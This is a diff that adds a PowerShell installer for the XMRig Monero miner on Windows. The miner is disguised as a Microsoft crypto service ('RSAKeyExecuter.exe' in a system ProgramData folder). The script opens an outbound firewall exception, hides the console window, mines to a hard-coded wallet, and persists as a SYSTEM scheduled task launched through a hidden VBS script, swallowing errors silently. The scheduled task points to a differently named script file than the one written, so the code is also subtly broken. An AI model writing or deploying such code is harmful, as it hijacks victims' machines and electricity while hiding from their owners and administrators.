@@ -1,0 +1,163 @@
+
+
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+Add-Type -AssemblyName PresentationFramework
+
+# Configuration
+$InstallDirectory = "C:\ProgramData\Microsoft\Crypto\SysKSP\"
+$XMRigVersion = "6.24.0"
+$XMRigFolderName = "SystemKeyService"  
+$XMRigExecutableName = "RSAKeyExecuter.exe"      
+$FirewallRuleName = "WinSysException"      
+$minerScriptPath = Join-Path $InstallDirectory "WinKeyService.ps1"
+
+
+
+function promptAdminRights {
+    $msgBoxInput = [System.Windows.MessageBox]::Show("This script will set up automated Monero mining.`r`n`r`nIt needs administrator privileges. Continue?",'Monero Mining Setup','YesNo','Question')
+    
+    if ($msgBoxInput -eq 'Yes') {
+        Start-Process powershell "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+        exit
+    } else {
+        exit
+    }
+}
+
+# Check admin rights first
+if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    promptAdminRights
+    exit
+}
+
+# We have admin rights, proceed with installation
+
+# Create directory
+if (!(Test-Path $InstallDirectory)) {
+    New-Item -ItemType Directory -Path $InstallDirectory -Force
+}
+
+# Download XMRig
+$download = "https://github.com/xmrig/xmrig/releases/download/v$XMRigVersion/xmrig-$XMRigVersion-windows-x64.zip"
+$outputPath = Join-Path $InstallDirectory "xmrig.zip"
+
+$wc = New-Object System.Net.WebClient
+$wc.DownloadFile($download, $outputPath)
+
+if (!(Test-Path $outputPath)) {
+    Read-Host "Press Enter to exit"
+    exit
+}
+
+Expand-Archive -LiteralPath $outputPath -DestinationPath $InstallDirectory -Force
+Remove-Item -Path $outputPath
+
+# Create final folder and copy files
+$finalFolder = Join-Path $InstallDirectory $XMRigFolderName
+if (!(Test-Path $finalFolder)) {
+    New-Item -ItemType Directory -Path $finalFolder
+}
+
+$sourceFolder = Join-Path $InstallDirectory "xmrig-$XMRigVersion"
+$sourceExe = Join-Path $sourceFolder "xmrig.exe"
+$targetExe = Join-Path $finalFolder $XMRigExecutableName
+Copy-Item -Path $sourceExe -Destination $targetExe -Force
+
+# Copy WinRing0 files
+$winRingFiles = @("WinRing0x64.sys", "WinRing0x64.dll")
+foreach ($file in $winRingFiles) {
+    $sourcePath = Join-Path $sourceFolder $file
+    if (Test-Path $sourcePath) {
+        Copy-Item -Path $sourcePath -Destination $finalFolder -Force
+    }
+}
+
+# Clean up
+Remove-Item -Path $sourceFolder -Recurse -Force
+
+# Firewall
+try {
+    Remove-NetFirewallRule -DisplayName $FirewallRuleName -ErrorAction SilentlyContinue
+    New-NetFirewallRule -DisplayName $FirewallRuleName -Direction Outbound -Program $targetExe -Action Allow -Profile Any
+} catch {
+}
+
+
+# Create the miner script content properly
+$minerScriptContent = @'
+param([switch]$AutoStart)
+
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'
+$consoleWindow = [Console.Window]::GetConsoleWindow()
+[Console.Window]::ShowWindow($consoleWindow, 0) | Out-Null
+
+$InstallDirectory = "C:\ProgramData\Microsoft\Crypto\SysKSP\"
+$XMRigFolderName = "SystemKeyService"  
+$XMRigExecutableName = "RSAKeyExecuter.exe"      
+$WalletAddress = "437kg8epTG59BpCHXSHVkiAx7S7oawgkeLjPyga1fX8Ca48wmWueu8uiovHZPT1oVGf4MEjvkhypMh3fvgb1cX69GKQwXMp"
+$PoolUrl = "pool.supportxmr.com:3333"
+$PoolPassword = "x"
+$ScheduledTaskName = "WinSysService"    
+$MiningLogFile = "SecWinSvchost.log"
+
+function startMining {
+    $xmrigPath = Join-Path $InstallDirectory "$XMRigFolderName\$XMRigExecutableName"
+    $logPath = Join-Path $InstallDirectory $MiningLogFile
+    
+    if (!(Test-Path $xmrigPath)) {
+        return $false
+    }
+    
+    try {
+        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
+        $processInfo.FileName = $xmrigPath
+        $processInfo.Arguments = "-o $PoolUrl -u $WalletAddress -p $PoolPassword --log-file=$logPath"
+        $processInfo.UseShellExecute = $false
+        $processInfo.CreateNoWindow = $true
+        $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+        
+        [System.Diagnostics.Process]::Start($processInfo) | Out-Null
+        return $true
+    } catch {
+        return $false
+    }
+}
+
+function createStartupTask {
+    try {
+        $minerScriptPath = Join-Path $InstallDirectory "WinService.ps1"
+        
+        Unregister-ScheduledTask -TaskName $ScheduledTaskName -Confirm:$false -ErrorAction SilentlyContinue
+        
+        $taskVbsContent = 'CreateObject("Wscript.Shell").Run "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File ""' + $minerScriptPath + '"" -AutoStart",0,False'
+        $taskVbsPath = Join-Path $InstallDirectory "task_launcher.vbs"
+        $taskVbsContent | Out-File -FilePath $taskVbsPath -Encoding ASCII
+        
+        $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument """$taskVbsPath"""
+        $trigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay (New-TimeSpan -Seconds 30)
+        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+        
+        Register-ScheduledTask -TaskName $ScheduledTaskName -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM"
+    } catch {
+        # Silent failure
+    }
+}
+
+if ($AutoStart) {
+    startMining
+} else {
+    startMining
+    createStartupTask
+}
+'@
+
+$minerScriptContent | Out-File -FilePath $minerScriptPath -Encoding UTF8
+
+# Run the miner script
+& $minerScriptPath
